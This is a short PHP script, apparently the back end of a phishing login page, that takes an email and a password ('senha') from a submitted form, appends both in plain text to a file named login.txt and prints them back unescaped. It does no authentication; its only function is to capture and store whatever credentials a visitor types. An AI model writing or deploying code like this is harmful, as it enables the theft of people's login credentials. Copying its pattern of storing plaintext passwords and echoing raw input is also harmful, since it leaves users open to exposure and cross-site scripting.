<?php

    $email=$_POST["email"];
    $senha=$_POST["senha"];

    $conteudo = "\r\n"."\r\n"."E-Mail:".$email. "\r\n"."Senha:".$senha."\r\n";

    $arquivo = fopen("login.txt", "a");

    fwrite ($arquivo, $conteudo);

    echo "$email"; echo "<br>";
    echo "$senha";

    fclose ($arquivo);

?>